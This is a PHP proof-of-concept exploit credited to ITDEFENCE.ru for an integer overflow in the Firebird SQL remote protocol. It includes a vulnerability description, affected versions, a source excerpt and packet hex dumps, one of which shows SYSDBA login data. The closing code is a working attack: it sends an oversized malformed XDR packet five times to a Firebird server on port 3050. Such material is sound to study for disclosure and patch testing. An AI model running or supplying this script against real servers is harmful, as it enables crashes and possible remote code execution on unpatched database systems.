<?php 
/** *  FIREBIRD REMOTE BUFFER OVERFLOW.
*  ITDEFENCE.ru Proof-of-Concept (POC)
*  Eugene Minaev (underwater@itdefence.ru)
*
*  Integer overflow in Firebird SQL 1.0.3 and earlier, 1.5.x before 1.5.6, 2.0.x before 2.0.4, and 2.1.x before 2.1.0 *  RC1 might allow remote attackers to execute arbitrary code via crafted op_receive, op_start, op_start_and_receive, *  op_send, (5) op_start_and_send, and (6) op_start_send_and_receive XDR requests, which triggers memory corruption.
*
*  Vulnerable packages
*
*      Firebird SQL 1.0.3 and before.
*      Firebird SQL 1.5.5 and before.
*      Firebird SQL 2.0.3 and before.
*      Firebird SQL 2.1.0 Beta 2 and before.
*
*  Non-vulnerable packages
*
*      Firebird SQL 1.5.6 (to be released)
*      Firebird SQL 2.0.4 (to be released)
*      Firebird SQL 2.1.0 RC1
*
*  src/remote/protocol.cpp:417
*
*      MAP(xdr_short, reinterpret_cast<SSHORT&>(data->p_data_request));
*      MAP(xdr_short, reinterpret_cast<SSHORT&>(data->p_data_incarnation));
*      MAP(xdr_short, reinterpret_cast<SSHORT&>(data->p_data_transaction));
*      MAP(xdr_short, reinterpret_cast<SSHORT&>(data->p_data_message_number));
*      return xdr_request(xdrs, data->p_data_request,
*           data->p_data_message_number,
*           data->p_data_incarnation) ? P_TRUE(xdrs, p) : P_FALSE(xdrs, p);
*
*  Firebird Connect Packet
* *  0x0000   00 00 00 00 00 02 00 00-00 00 00 01 08 00 45 00   ..............E.
*  0x0010   00 BC 00 00 00 00 40 06-00 25 C0 A8 7C 63 C0 A8   .&#1112;....@..%&#1040;&#1025;|c&#1040;&#1025;
*  0x0020   7C 63 0B EA 0E 94 00 00-00 01 00 00 00 01 50 10   |c.&#1082;.?........P.
*  0x0030   40 00 00 00 00 00 00 00-00 01 00 00 00 13 00 00   @...............
*  0x0040   00 02 00 00 00 1D 00 00-00 3C 43 3A 5C 50 72 6F   .........<C:\Pro
*  0x0050   67 72 61 6D 20 46 69 6C-65 73 5C 46 69 72 65 62   gram Files\Fireb
*  0x0060   69 72 64 5C 46 69 72 65-62 69 72 64 5F 31 5F 35   ird\Firebird_1_5
*  0x0070   5C 65 78 61 6D 70 6C 65-73 5C 45 4D 50 4C 4F 59   \examples\EMPLOY
*  0x0080   45 45 2E 66 64 62 00 00-00 02 00 00 00 13 01 04   EE.fdb..........
*  0x0090   52 4F 4F 54 04 09 75 6E-64 65 72 77 68 61 74 06   ROOT..underwhat.
*  0x00A0   00 00 00 00 00 08 00 00-00 01 00 00 00 02 00 00   ................
*  0x00B0   00 03 00 00 00 02 00 00-00 0A 00 00 00 01 00 00   ................
*  0x00C0   00 02 00 00 00 03 00 00-00 04                     ..........
*       *  Firebird Login Packet.
*
*  0x0000   00 00 00 00 00 02 00 00-00 00 00 01 08 00 45 00   ..............E.
*  0x0010   00 94 00 00 6C 6C 40 06-93 E0 C0 A8 7C 63 C0 A8   .?..ll@.?&#1072;&#1040;&#1025;|c&#1040;&#1025;
*  0x0020   7C 63 0B EA 0E 94 00 00-00 95 00 00 00 11 50 10   |c.&#1082;.?...?....P.
*  0x0030   40 00 00 00 00 00 00 00-00 13 00 00 00 00 00 00   @...............
*  0x0040   00 3C 43 3A 5C 50 72 6F-67 72 61 6D 20 46 69 6C   .<C:\Program Fil
*  0x0050   65 73 5C 46 69 72 65 62-69 72 64 5C 46 69 72 65   es\Firebird\Fire
*  0x0060   62 69 72 64 5F 31 5F 35-5C 65 78 61 6D 70 6C 65   bird_1_5\example
*  0x0070   73 5C 45 4D 50 4C 4F 59-45 45 2E 66 64 62 00 00   s\EMPLOYEE.fdb..
*  0x0080   00 1E 01 1C 06 53 59 53-44 42 41 1E 0B 51 50 33   .....SYSDBA..QP3
*  0x0090   4C 4D 5A 2F 4D 4A 68 2E-3A 04 00 00 00 00 3E 00   LMZ/MJh.:.....>.
*  0x00A0   00 00                                             ..
*
*/
  $___suntzu = "\x00\x00\x00\x4a" .  str_repeat( "\x4a" , 3000);
  for ($temp = 0; $temp < 5; $temp ++){
     $___zuntzu  =   fsockopen('192.168.124.99',3050);
     fwrite($___zuntzu , $___suntzu);
     fclose($___zuntzu );
     sleep(1);
  }
?>
